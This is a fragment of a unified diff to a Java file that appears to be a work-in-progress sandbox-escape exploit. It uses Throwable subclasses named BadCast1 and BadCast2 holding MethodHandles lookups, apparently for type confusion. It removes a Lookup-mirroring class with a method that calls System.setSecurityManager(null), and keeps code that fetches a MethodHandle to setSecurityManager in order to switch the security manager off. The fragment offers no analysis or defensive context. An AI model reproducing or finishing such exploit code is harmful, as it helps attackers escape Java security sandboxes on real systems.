@@ -2,19 +2,7 @@ import java.lang.invoke.MethodHandle;
 import java.lang.invoke.MethodHandles;
 import java.lang.invoke.MethodType;
 
-
 public class Main {
-
-
-	public class LookupMirror extends Lookup{
-	Class<?> lookupClass;
-	int allowedModes;
-	
-		public void setSecurityNull() {
-			System.setSecurityManager(null);
-		}
-	}
-
 	public static class BadCast1 extends Throwable{
 		Object o1 = MethodHandles.publicLookup();
 	}
@@ -32,7 +20,7 @@ public class Main {
 	}
 	
 	public static void main(String[] args) throws Throwable {
-		BadCast2 e = new BadCast2();
+		BadCast1 e = new BadCast2();
 		handleEx(e);
 		MethodType mt = MethodType.methodType(void.class, System.class);
 		MethodHandle mh = MethodHandles.lookup().findStatic(System.class, "setSecurityManager", mt);
